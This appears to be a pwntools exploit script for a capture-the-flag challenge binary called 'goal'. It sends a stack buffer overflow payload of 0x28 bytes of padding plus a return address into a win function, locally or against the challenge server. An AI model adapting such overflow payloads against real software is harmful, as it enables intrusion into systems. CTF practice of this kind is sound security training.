from pwn import *


# initialize the binary
binary = "./goal"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *main+56
continue
"""

if args.REMOTE:
    p = remote("goal.chal.cyberjousting.com", 1358)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


# overflow
payload = flat(
    b'a'*0x28,          # padding
    p64(0x40119d+1),    # goal()
)
p.sendline(payload)

p.interactive()
